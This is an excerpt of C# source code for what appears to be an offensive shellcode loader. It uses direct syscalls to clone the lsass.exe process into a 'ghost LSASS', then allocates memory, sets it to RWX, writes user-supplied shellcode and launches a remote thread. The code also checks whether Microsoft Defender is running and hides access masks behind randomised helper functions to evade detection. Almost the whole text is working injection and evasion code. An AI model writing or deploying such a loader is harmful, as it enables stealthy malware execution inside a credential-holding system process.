...
[StructLayout(LayoutKind.Sequential)]
  ...
  public struct OBJECT_ATTRIBUTES
  {
    ...
    public IntPtr SecurityQualityOfService;
        ...
        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS ZwOpenProcessX(out IntPtr ProcessHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);
        public static NTSTATUS ZwOpenProcess(out IntPtr ProcessHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, ref OSVERSIONINFOEXW osVersionInfo)
        {
            ...
            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    ...
                    return (NTSTATUS)ZwOpenProcessFunc(out ProcessHandle, processAccess, objAttribute, ref clientid);
                }
        ...
        {
        		byte [] syscall = GetOSVersionAndReturnSyscall( 10, ref osVersionInfo );
        		unsafe
        		{
        				fixed (byte* ptr = syscall)
        				{
        ...
        public static int FindClonedProcess(string processName)
        {
          int result = 0;
        ...
        public static int ReturnUpper()
        {
		        Random number = new Random();
		        int code = number.Next(200);
		        int a, b;
		        while ( code != 100)
		        {
        ...
        public static bool IsDefenderRunning()
        {
            ...
            foreach (ManagementObject mObj in mClass.GetInstances())
            {
               if ( mObj["Name"].Equals("MsMpEng.exe") )
               {
        ...
        {
            byte[] scode = new byte[ SHELLCODE LENGTH HERE] { INSERT YOUR SHELLCODE HERE };
            ...
            OBJECT_ATTRIBUTES ObjAttr = new OBJECT_ATTRIBUTES
            {
                ...
                Attributes = 0x00000020,  // OBJ_EXCLUSIVE
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            int ProcId = FindClonedProcess("lsass.exe");
            ...
            ZwOpenProcess( out procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid, ref osVersionInfo );

            IntPtr ProcessHandle = IntPtr.Zero;
            ZwCreateProcess( out ProcessHandle, ACCESS_MASK.GENERIC_ALL, ObjAttr, procHandle, true, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref osVersionInfo );

            clientid.UniqueThread = IntPtr.Zero; // At this time there exist no thread in our ghost LSASS process, so this must be Zero.
            clientid.UniqueProcess = new IntPtr(ProcId);

            IntPtr ptrToGhostLSASS = IntPtr.Zero;
            ZwOpenProcess( out ptrToGhostLSASS, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid, ref osVersionInfo );

            IntPtr allocMemAddress = new IntPtr();
            IntPtr scodeSize = (IntPtr)(UInt32)scode.Length;

            // Allocate memory without RWX
            ZwAllocateVirtualMemory( ptrToGhostLSASS, ref allocMemAddress, new IntPtr(0), ref scodeSize, 0x1000 | 0x2000, 0x10, ref osVersionInfo );

            // Change allocated memory to RWX
            UInt32 BytesWritten = 0;
            ZwProtectVirtualMemory( ptrToGhostLSASS, ref allocMemAddress, ref scodeSize, (UInt32)ReturnRight(), ref BytesWritten, ref osVersionInfo );

            IntPtr bytesWritten  = IntPtr.Zero;
            IntPtr uPtr = Marshal.AllocHGlobal(scode.Length);
            Marshal.Copy(scode, 0, uPtr, scode.Length);
            ZwWriteVirtualMemory( ptrToGhostLSASS, ref allocMemAddress, uPtr, (UInt32)(scodeSize), ref bytesWritten, ref osVersionInfo );
            Marshal.FreeHGlobal(uPtr);

            IntPtr hRemoteThread = IntPtr.Zero;
            ZwCreateThreadEx( out hRemoteThread, (UInt32)ReturnUpper(), IntPtr.Zero, ptrToGhostLSASS, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero, ref osVersionInfo );

            ZwClose(procHandle, ref osVersionInfo);
            ZwClose(ProcessHandle, ref osVersionInfo);
            ZwClose(ptrToGhostLSASS, ref osVersionInfo);
            ZwClose(hRemoteThread, ref osVersionInfo);
        }
    }
}
